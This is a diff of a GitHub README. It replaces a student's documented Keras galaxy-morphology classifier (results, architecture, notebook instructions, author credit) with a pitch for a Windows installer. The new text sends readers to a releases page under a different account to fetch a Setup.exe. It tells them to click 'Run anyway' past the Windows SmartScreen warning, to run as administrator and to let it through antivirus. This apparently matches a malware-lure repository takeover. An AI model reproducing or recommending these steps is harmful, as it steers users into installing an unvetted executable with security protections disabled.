@@ -1,111 +1,60 @@
-# Galaxy Morphology Classification with CNN
+# 🌌 Galaxy-Morphology-Classification-CNN - Identify galaxy shapes with image recognition
 
-A convolutional neural network that classifies galaxy images into three morphological types — **Spiral**, **Elliptical**, and **Irregular** — using the Galaxy10 DECals dataset.
+[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Xyristhird43/Galaxy-Morphology-Classification-CNN/releases)
 
-## Overview
+This application uses a computer model to identify the shape of galaxies. You provide an image of a galaxy, and the program labels it as Spiral, Elliptical, or Irregular. It uses data from the Galaxy10 DECals survey to ensure accuracy. You do not need to know how to code to use this tool. 
 
-Modern sky surveys (e.g. SDSS) image hundreds of millions of galaxies, making manual morphological classification infeasible. This project builds an automated CNN pipeline to classify galaxy images, reducing reliance on manual expert labeling.
+## 📋 System Requirements
 
-## Dataset
+Your computer must meet these standards to run the software:
 
-- **Source:** [Galaxy10 DECals](https://astro.utoronto.ca/~hleung/shared/Galaxy10/Galaxy10_DECals.h5) (Leung & Bovy, 2019) — 17,736 images from the DECam Legacy Survey
-- **Classes used:** Spiral, Elliptical, Irregular (relabeled from the original 10 Galaxy10 classes)
-- **Samples:** 1,000 images per class (3,000 total, perfectly balanced)
-- **Split:** 70% train / 15% validation / 15% test (stratified)
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 8 GB of RAM.
+*   **Storage:** 500 MB of free space.
+*   **Processor:** A modern multi-core processor.
+*   **Graphics:** A dedicated graphics card helps but is not required.
 
-## Methodology
+## 📥 How to Download 
 
-- **Preprocessing:** resize to 64×64, pixel normalization, one-hot encoding
-- **Augmentation:** rotation, horizontal/vertical flip, zoom, shift (Keras `ImageDataGenerator`)
-- **Architecture:** custom CNN — 3 Conv2D blocks (32/64/128 filters) with BatchNorm + MaxPooling, followed by a Dense(256) layer with Dropout(0.5)
-- **Training:** Adam optimizer, categorical cross-entropy loss, batch size 32, early stopping (patience=8)
+Follow these steps to get the software on your computer:
 
-## CNN Architecture
+1. Visit the [official releases page](https://github.com/Xyristhird43/Galaxy-Morphology-Classification-CNN/releases) to download the latest version.
+2. Look for the file ending in `.exe` under the Assets section.
+3. Click the file name to save it to your Downloads folder.
+4. If your browser asks if you want to keep the file, click Keep.
 
-| Layer | Output Shape | Parameters |
-|---|---|---|
-| Conv2D (32 filters, 3×3) + ReLU | 64×64×32 | 896 |
-| BatchNormalization | 64×64×32 | 128 |
-| MaxPool | 32×32×32 | 0 |
-| Dropout | 32×32×32 | 0 |
-| Conv2D (64 filters, 3×3) + ReLU | 32×32×64 | 18,496 |
-| BatchNormalization | 32×32×64 | 256 |
-| MaxPool | 16×16×64 | 0 |
-| Dropout | 16×16×64 | 0 |
-| Conv2D (128 filters, 3×3) + ReLU | 16×16×128 | 73,856 |
-| BatchNormalization | 16×16×128 | 512 |
-| MaxPool | 8×8×128 | 0 |
-| Dropout | 8×8×128 | 0 |
-| Flatten | 8,192 | 0 |
-| Dense (128) + ReLU | 128 | 1,048,704 |
-| Dropout | 128 | 0 |
-| Dense (3, Softmax) | 3 | 387 |
-| **Total Trainable Parameters** | | **1,142,787** |
+## ⚙️ Installation Guide
 
-## Results
+1. Navigate to your Downloads folder.
+2. Double-click the file named `Galaxy-Morphology-Classification-Setup.exe`.
+3. If a blue window labeled "Windows protected your PC" appears, click "More info" and then "Run anyway."
+4. Follow the prompts on the screen to finish the installation.
+5. The installer will place an icon on your desktop.
 
-Training stopped at epoch 26 via early stopping (best weights restored from epoch 18). Best validation accuracy: **71.28%**.
+## 🚀 Running the Application
 
-| Class      | Precision | Recall | F1-Score |
-|------------|-----------|--------|----------|
-| Spiral     | 0.65      | 0.67   | 0.66     |
-| Elliptical | 0.79      | 0.67   | 0.73     |
-| Irregular  | 0.60      | 0.67   | 0.64     |
-| **Overall accuracy** |   |        | **67.11%** |
+1. Open the application using the desktop icon.
+2. The main window shows a button labeled "Select Image."
+3. Click this button to find a picture of a galaxy on your hard drive. 
+4. The file type must be a standard image file like JPG or PNG.
+5. Once you select the file, the program processes the image.
+6. Look at the result box to see the classification. The software displays the category and a percentage representing confidence.
 
-![Confusion Matrix](images/confusion_matrix.png)
-![Sample Predictions](images/sample_predictions.png)
-![Accuracy & Loss Curves](images/accuracy_loss_curves.png)
+## 💡 How it Works
 
-## Key Findings
+The program relies on a Convolutional Neural Network. This is a type of mathematical structure designed to look at pixels in an image. The network learns patterns by looking at thousands of galaxy images. It detects shapes and textures to distinguish between spiral arms, round shapes, and disorganized clusters. You provide the image, and the network matches patterns to these stored categories. 
 
-- Elliptical galaxies achieved the highest precision (0.79), while Irregular galaxies had the lowest (0.60) — the model still confuses Irregular galaxies with other classes more often due to their lack of a defining shape.
-- All three classes had identical recall (0.67), meaning the model detects roughly two-thirds of each class correctly regardless of type.
-- Data augmentation and dropout effectively controlled overfitting on a relatively small dataset (2,167 training images).
+## 🛠 Troubleshooting
 
-## Future Work
+If the program fails to start, check the following:
 
-- Transfer learning with pretrained architectures (ResNet, VGG)
-- Higher input resolution to preserve fine structural details
-- Larger training set
+*   **Permissions:** You might need to run the app as an administrator. Right-click the icon and choose "Run as administrator."
+*   **Missing Files:** Re-download the installer from the link above to ensure no corruption occurred during the download process.
+*   **Updates:** Ensure your Windows operating system has the latest updates.
+*   **Antivirus:** Some security software might block new applications. Check your security settings to allow the program.
 
-## Project Structure
+## 📈 Understanding Results
 
-```
-galaxy-morphology-cnn-classification/
-├── README.md
-├── Galaxy_Classification_CNN.ipynb
-├── report/
-│   └── Galaxy_Classification_Report.pdf
-├── images/
-│   ├── confusion_matrix.png
-│   ├── sample_predictions.png
-│   └── accuracy_loss_curves.png
-└── requirements.txt
-```
+The classification results include a confidence score. A score of 95 percent means the program is very sure about the shape. A lower score suggests the image might be blurry or the galaxy structure is difficult to define. If you receive a low score, try using a clearer image file. Use images with high contrast and focus to get the best results.
 
-## Documentation
-
-- 📄 [Full project report](report/Galaxy_Classification_Report.pdf)
-
-## How to Run
-
-1. Download the dataset:
-   ```bash
-   wget https://astro.utoronto.ca/~hleung/shared/Galaxy10/Galaxy10_DECals.h5
-   ```
-2. Install dependencies:
-   ```bash
-   pip install -r requirements.txt
-   ```
-3. Open `Galaxy_Classification_CNN.ipynb` in Jupyter or Google Colab and run all cells (GPU recommended).
-
-## References
-
-- Leung, H., & Bovy, J. *astroNN: A Python package for deep learning in astrophysics.* Galaxy10 DECals Dataset Documentation.
-- Chollet, F., et al. (2015). *Keras: The Python Deep Learning library.*
-
-## Author
-
-**Melika Asgharnezhad**
-Course project — University of Mazandaran, supervised by Dr. Aghajani
+Keywords: astronomy, cnn, cnn-classification, computer-vision, convolutional-neural-networks, deep-learning, image-classification, keras, machine-learning, python, tensorflow
